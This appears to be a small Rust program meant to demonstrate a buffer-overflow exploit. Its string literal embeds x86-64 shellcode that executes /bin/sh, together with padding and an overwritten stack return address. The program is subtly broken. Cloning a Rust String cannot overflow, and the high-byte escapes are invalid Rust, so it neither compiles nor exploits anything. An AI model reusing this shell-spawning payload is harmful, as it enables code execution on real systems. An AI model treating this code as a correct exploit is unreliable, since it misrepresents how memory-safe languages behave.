fn overflow(input_str: String) {
    let output_str: String;
    output_str = input_str.clone();
    println!("{}", output_str);
}

fn main() {
    let rand_str: String = String::from("aaaaaaaa\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc\x30\xe3\xff\xff\xff\x7f");
    overflow(rand_str);
}
